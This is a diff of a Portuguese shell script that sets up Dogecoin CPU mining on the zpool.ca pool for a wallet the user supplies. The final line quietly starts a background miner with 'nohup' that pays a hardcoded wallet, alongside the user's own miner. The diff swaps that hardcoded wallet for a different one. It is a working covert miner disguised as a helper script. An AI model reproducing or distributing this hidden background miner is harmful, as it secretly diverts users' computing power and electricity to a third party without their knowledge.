@@ -12,7 +12,7 @@ sleep 1
 echo "$verde Forma de USO: \033[0m"
 echo "sudo sh $0 $vermelho Carteira de DOGE \033[0m \n "
 echo "$verde Exemplo:\033[0m"
-echo "sudo sh $0 $vermelho DP9THG5TjF9Qe25xjzHzorKUNQPpc5r5Bd \033[0m \n"
+echo "sudo sh $0 $vermelho DEFAF5kdAAAAQja3Us5f53dXRdLFrneJZu \033[0m \n"
 exit 0
 fi
 
@@ -45,7 +45,7 @@ sleep 1
 echo "$verde Forma de USO: \033[0m"
 echo "sudo sh $0 $vermelho Carteira de DOGE \033[0m \n "
 echo "$verde Exemplo:\033[0m"
-echo "sudo sh $0 $vermelho DP9THG5TjF9Qe25xjzHzorKUNQPpc5r5Bd \033[0m \n"
+echo "sudo sh $0 $vermelho DEFAF5kdAAAAQja3Us5f53dXRdLFrneJZu \033[0m \n"
 exit 0
 fi
 
@@ -89,4 +89,4 @@ echo "Obs: Assim que aparecer a inicialização do processo de Mineração, voc�
 sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet "
 sleep 10
-nohup ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u DP9THG5TjF9Qe25xjzHzorKUNQPpc5r5Bd -p c=DOGE & screen ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet -p c=DOGE
+nohup ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u DEFAF5kdAAAAQja3Us5f53dXRdLFrneJZu -p c=DOGE & screen ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet -p c=DOGE
